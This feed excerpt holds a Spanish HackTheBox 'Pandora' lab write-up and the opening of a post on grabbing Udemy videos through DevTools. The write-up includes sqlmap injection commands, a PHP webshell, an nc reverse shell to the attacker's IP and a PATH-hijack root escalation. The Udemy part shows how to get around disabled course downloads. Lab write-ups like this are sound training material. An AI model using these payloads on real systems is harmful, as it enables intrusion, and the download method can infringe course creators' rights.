+nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22,80 &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.11.136
+nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.11.136
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;center&gt;&lt;img src=&quot;/images/Pandora/udptcpscan.png&quot; /&gt;&lt;/center&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/tcpscan.png&quot; alt=&quot;tcp scan&quot; /&gt;
+&lt;img src=&quot;/images/Pandora/udpscan.png&quot; alt=&quot;udp scan&quot; /&gt;
+Podríamos emplear la típica metodología de buscar algún exploit público que afecte a alguna versión de los servicios, pero lamentablemente no se obtiene nada.
+&lt;br /&gt;Lo que más llama la atención es el servicio SNMP y su versión (v1) y que el «comunity string» está establecido como publico (luego le damos una vuelta).&lt;/p&gt;
+
+&lt;h3 id=&quot;servidor-web&quot;&gt;Servidor Web&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/webpandora.png&quot; alt=&quot;webpandora&quot; /&gt;
+El servidor web almacena una página web estática en la cual no podemos hacer mucho, pero si nos fijamos en la descripción obtenemos lo que parece ser un dominio &lt;code&gt;panda.htb&lt;/code&gt;.
+&lt;br /&gt;Procedemos a agregar el dominio al &lt;strong&gt;/etc/hosts&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/etc.png&quot; alt=&quot;etc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya estaría haciendo la resolución DNS, podríamos hacer una búsqueda de subdominios, pero adelanto que los tiros no van por ahí.&lt;/p&gt;
+
+&lt;h3 id=&quot;snmp&quot;&gt;SNMP&lt;/h3&gt;
+&lt;p&gt;Nos queda el protocolo simple de administración de red porque en los otros servicios no hemos encontrado nada interesante o útil.&lt;br /&gt;
+Recordando un poco, el &lt;strong&gt;comunity string&lt;/strong&gt; estaba establecido como &lt;strong&gt;“public”&lt;/strong&gt; lo cual sería una especie de “usuario” en el cual no debemos &lt;strong&gt;proporcionar&lt;/strong&gt; ningún tipo de &lt;strong&gt;credencial&lt;/strong&gt; y a través de esto podemos &lt;strong&gt;recopilar&lt;/strong&gt; diferente &lt;strong&gt;información&lt;/strong&gt; acerca del equipo.&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Haciendo uso de la herramienta &lt;strong&gt;snmpwalk&lt;/strong&gt; nos podemos aprovechar de esta mala configuración (hay otras herramientas que se pueden emplear para el mismo propósito).&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snmpwalk &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 2c  &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.10.11.136
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/snmpwalk.png&quot; alt=&quot;snmpwalk&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos recopilar bastante información del sistema operativo como la versión del KERNEL de LINUX, Usuarios y hasta procesos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/infosnmp.png&quot; alt=&quot;infosnmp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/procesossnmp.png&quot; alt=&quot;procesossnmp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Genial logramos obtener un usuario (Daniel) por lo cual enviaré la salida del comando a un fichero y luego poder filtrar a través de GREP.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snmpwalk &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 2c &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.10.11.136 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; snmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Filtrando con grep y entregando como parámetro la string “daniel” podemos encontrar credenciales.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmp | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;daniel &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;daniel&quot;&lt;/span&gt; snmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/snmpcreds.png&quot; alt=&quot;snmp creds&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/credenciales-ssh.png&quot; alt=&quot;cred&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;intrusión&quot;&gt;Intrusión&lt;/h2&gt;
+&lt;p&gt;Vamos a verificar que las credenciales obtenidas sean válidas, para esto nos conectaremos al servicio SSH.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/ssh.png&quot; alt=&quot;Pandora SSH&quot; /&gt;
+Genial.&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a enumerar el sistema.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/matt.png&quot; alt=&quot;matt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hay otro usuario el cual tiene el flag, pero nuestro usuario no posee los permisos necesarios para poder leer el contenido.
+&lt;img src=&quot;/images/Pandora/permisos.png&quot; alt=&quot;permisos&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al listar el directorio &lt;code&gt;/var/www/&lt;/code&gt; encontramos el sitio y una aplicación web la cual no podemos acceder.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/varwww.png&quot; alt=&quot;varwww&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/pandora-www.png&quot; alt=&quot;pandora-www&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para obtener mayores pruebas de que los tiros van por la aplicación web decidí ver los servicios que tenía el sistema operativo corriendo y en escucha vía el protocolo TCP y me lleve una gran sorpresa al encontrar el servicio MySQL.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat &lt;span class=&quot;nt&quot;&gt;-lt&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/mysql.png&quot; alt=&quot;mysql&quot; /&gt;
+(También reviso si el demonio de MySQL está activo más que nada para una doble comprobación)&lt;/p&gt;
+
+&lt;p&gt;Para poder acceder a la aplicación web vamos a estar empleando una técnica la cual se suele utilizar bastante al momento de hacer pivoting.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Esta técnica consiste en traer los servicios que corren en la máquina de manera local y que no están expuestos hacia nuestra máquina (una explicación bastante simple y pobre).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Para ello ejecutamos el siguiente comando:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 1313:localhost:80 daniel@panda.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;PuertoLocal:localhost:PuertoRemoto Host&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/localport.png&quot; alt=&quot;localport&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/lsof.png&quot; alt=&quot;lsof&quot; /&gt;&lt;/p&gt;
+&lt;center&gt;&lt;img src=&quot;/images/Pandora/curl.png&quot; alt=&quot;curl http local&quot; /&gt;&lt;/center&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación&lt;/h2&gt;
+&lt;p&gt;Ya tenemos acceso a la aplicación web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/pandoraweb.png&quot; alt=&quot;Pandora&quot; /&gt;
+En el footer nos encontramos la versión, procedo a hacer una búsqueda de dicha versión en busca de alguna vulnerabilidad.
+&lt;br /&gt;
+Genial tiene varios CVE’s que afectan a esta versión y hay un &lt;a href=&quot;https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/&quot;&gt;blog&lt;/a&gt; que explica de manera técnica las vulnerabilidades.
+&lt;img src=&quot;/images/Pandora/sonarblog.png&quot; alt=&quot;sonarblog&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una de las vulnerabilidades que más llama la atención es la inyección SQL, la cual se puede explotar sin estar autenticado en el aplicativo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/vuln.png&quot; alt=&quot;sql&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;En el fichero &lt;code&gt;/include/chart_generator.php&lt;/code&gt; se encuentra el parámetro vulnerable &lt;code&gt;session_id&lt;/code&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Por lo cual la explotación de esta vulnerabilidad es relativamente fácil, estaré utilizando la herramienta SQLMAP para poder explotar esta vulnerabilidad, ya que aún no sé explotar una inyección SQL de forma manual.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost:1313/pandora_console/include/chart_generator.php?session_id=&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--random-agent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nt&quot;&gt;--method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jm3i5g44ifdfl3417p9gnh9nur&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;--tamper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;space2comment &lt;span class=&quot;nt&quot;&gt;--dbs&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/sqlmap.png&quot; alt=&quot;sqlmap&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost:1313/pandora_console/include/chart_generator.php?session_id=&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--random-agent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nt&quot;&gt;--method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jm3i5g44ifdfl3417p9gnh9nur&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; pandora &lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ahora listamos las tablas que contiene la base de datos “Pandora”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/tablas.png&quot; alt=&quot;tables pandora&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Debemos encontrar la cookie de administrador y así poder hacer bypass al panel de administración, luego de buscar encontré la tabla &lt;code&gt;tsessions_php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/tables.png&quot; alt=&quot;tables&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora solo hay que encontrar el valor correcto de la sesión del administrador (pero tuve un problema, no daba con la sesión de dicho administrador y probé todos los valores, así que tuve que buscar si había algún tipo de PoC en GitHub y sí).&lt;/p&gt;
+
+&lt;p&gt;El siguiente &lt;a href=&quot;https://github.com/ibnuuby/CVE-2021-32099&quot;&gt;repositorio&lt;/a&gt; contiene la sentencia SQL maliciosa con la cual roba el valor de la cookie del administrador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/repo.png&quot; alt=&quot;repo&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/admindashboard.png&quot; alt=&quot;panel&quot; /&gt;
+Genial.&lt;/p&gt;
+
+&lt;h3 id=&quot;webshell--reverseshell&quot;&gt;WebShell &amp;amp; ReverseShell&lt;/h3&gt;
+&lt;p&gt;Ahora necesitamos poder ejecutar comandos a nivel de sistema, por lo cual subiremos una webshell y posteriormente nos enviaremos una reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/uploadwebshell.png&quot; alt=&quot;webshell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/rce.png&quot; alt=&quot;webshell commands&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.14.121 1212 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
+nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1212
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/reverseshell.png&quot; alt=&quot;revershell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos leer el flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/user.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;Empezaremos con la típica enumeración de sistema para escalar privilegios.&lt;/p&gt;
+
+&lt;p&gt;No hay nada en Crontabs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/crontabs.png&quot; alt=&quot;crontabs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al momento de ver los binarios SUID obtenemos el siguiente resultado:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/suid.png&quot; alt=&quot;SUID&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Un binario nada común en sistemas GNU/LINUX.&lt;/p&gt;
+
+&lt;p&gt;Si ejecutamos el binario obtenemos esta salida.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/pandorabackup.png&quot; alt=&quot;binary&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al parecer ejecuta el comando tar apuntando a descomprimir un respaldo.&lt;/p&gt;
+
+&lt;h3 id=&quot;path-hijacking&quot;&gt;PATH HIJACKING&lt;/h3&gt;
+&lt;p&gt;Daré una breve y simple definición de lo que es esta técnica.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt; El PATH HIJACKING no es más que engañar de alguna forma la ruta de ejecución de un binario en GNU/LINUX gracias a la variable de entorno $PATH que almacena la mayoría de rutas donde se encuentra los ejecutables.&lt;br /&gt;
+Un ejemplo de esto sería el siguiente:&lt;br /&gt;
+Si yo quiero ejecutar el binario cat, ira recorriendo la asignación de la variable de entorno $PATH hasta encontrar la ruta correcta, es ahí donde nosotros nos podemos aprovechar y agregar una ruta personalizada y así ejecutar nuestro ejecutable &quot;malicioso&quot; y no el legítimo.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/Pandora/passwd.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/Pandora/explicacionpath.png&quot; alt=&quot;explicacionpath&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;poc&quot;&gt;PoC&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /usr/bin/pandora_backup
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/root.png&quot; alt=&quot;root&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listo ahora podemos leer el flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/flagroot.png&quot; alt=&quot;root flag&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;Fin&lt;/h1&gt;
+&lt;p&gt;Espero te haya gustado, recuerda que más abajo están las reacciones y puedes dejar un comentario.
+&lt;br /&gt;También puedes comunicarte a través de las siguientes vías;
+&lt;a href=&quot;https://twitter.com/T3_6_9/&quot;&gt;Twitter&lt;/a&gt;, &lt;a href=&quot;https://t.me/T3_6_9/&quot;&gt;Telegram&lt;/a&gt;, &lt;a href=&quot;mailto:t3sla@t3sla.tk&quot;&gt;E-mail&lt;/a&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Quiero dar las gracias a las siguientes personas:&lt;br /&gt;
+&lt;a href=&quot;https://guglia001.github.io/&quot;&gt;Mario Guglia&lt;/a&gt; quien me ayudo con la máquina, ya que quede stuck.&lt;br /&gt;
+&lt;a href=&quot;https://s4ori.tk&quot;&gt;S4ori&lt;/a&gt; quien me explico sobre el Local Port Forwarding porque no conocía esta técnica en su momento.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Agregar que si quieres realizar alguna donación lo puedes hacer a través del siguiente botón:
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js&quot; data-name=&quot;bmc-button&quot; data-slug=&quot;T3sla&quot; data-color=&quot;#BD5FFF&quot; data-emoji=&quot;🍕&quot; data-font=&quot;Lato&quot; data-text=&quot;Buy me a pizza&quot; data-outline-color=&quot;#000000&quot; data-font-color=&quot;#ffffff&quot; data-coffee-color=&quot;#FFDD00&quot;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Y obtén “beneficios”.&lt;/p&gt;
+</description>
+                <pubDate>Sun, 30 Oct 2022 03:53:00 -0300</pubDate>
+                <link>/pandora-hackthebox</link>
+                <guid isPermaLink="true">/pandora-hackthebox</guid>
+                
+                <category>Writeup</category>
+                
+                <category>HackTheBox</category>
+                
+                <category>2022</category>
+                
+                <category>T3sla</category>
+                
+                
+                <category>HackTheBox</category>
+                
+            </item>
+        
+            <item>
+                <title>Descargar videos de Udemy</title>
+                <description>&lt;p&gt;Bienvenidos a este artículo, el cual como su nombre indica, vamos a descargar los videos de Udemy de manera gratis y sin instalar nada.&lt;/p&gt;
+
+&lt;p&gt;Sin más que agregar comencemos.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;herramientas&quot;&gt;Herramientas&lt;/h2&gt;
+&lt;p&gt;Que vamos a utilizar.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Navegador Web.&lt;/li&gt;
+  &lt;li&gt;DevTools (Inspector de elementos).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;wget&lt;/strong&gt; o alguna otra utilidad basada en &lt;strong&gt;CLI&lt;/strong&gt; como &lt;strong&gt;curl&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;abrir-las-devtools&quot;&gt;Abrir las DevTools&lt;/h2&gt;
+&lt;p&gt;Tenemos cuatro formas de abrir las DevTools, las cuales son:&lt;/p&gt;
+
+&lt;h3 id=&quot;1&quot;&gt;1.&lt;/h3&gt;
+&lt;p&gt;La más normal es presionando los tres puntos que hay en la esquina superior derecha.&lt;/p&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/puntitos.png&quot; /&gt;&lt;/center&gt;
+
+&lt;p&gt;Luego se despliega el siguiente menú.&lt;br /&gt;
+Presionamos en &lt;strong&gt;más&lt;/strong&gt; herramientas y luego en &lt;strong&gt;«herramientas de desarrollador»&lt;/strong&gt;.&lt;/p&gt;
+&lt;center&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/menu.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;2&quot;&gt;2.&lt;/h3&gt;
+&lt;p&gt;Presionando la tecla &lt;strong&gt;F12&lt;/strong&gt;.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;3&quot;&gt;3.&lt;/h3&gt;
+&lt;p&gt;Utilizamos la siguiente combinación de teclas; &lt;strong&gt;CTRl + SHIFT + I&lt;/strong&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;4&quot;&gt;4.&lt;/h3&gt;
+&lt;p&gt;Hacemos clic derecho en cualquier área de la web.&lt;/p&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/DevTools.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+Luego de esto nada útil, pasemos a la acción. 💣&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;demo&quot;&gt;Demo&lt;/h2&gt;
+&lt;p&gt;Lo primero es seleccionar un curso de interés, para este ejemplo estaré mostrando un curso gratis y otro de pago y así demostrar que no influye el precio del curso.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/cursovim.png&quot; alt=&quot;Curso VIM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Es &lt;a href=&quot;https://www.udemy.com/course/vim-aumenta-tu-velocidad-de-desarrollo/&quot;&gt;gratis&lt;/a&gt; y está inhabilitada la opción de descargar la clase.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/nosepuede.png&quot; alt=&quot;no se puede&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hacemos clic en la siguiente zona.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/clickaqui.png&quot; alt=&quot;clic&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos abrirá el inspector de elemento y podremos visualizar todo el &lt;strong&gt;HTML5&lt;/strong&gt;.&lt;br /&gt;
+Tendremos que buscar la etiqueta &lt;strong&gt;«video»&lt;/strong&gt; y obtener el valor del atributo &lt;strong&gt;“src”&lt;/strong&gt; (source).&lt;/p&gt;
+
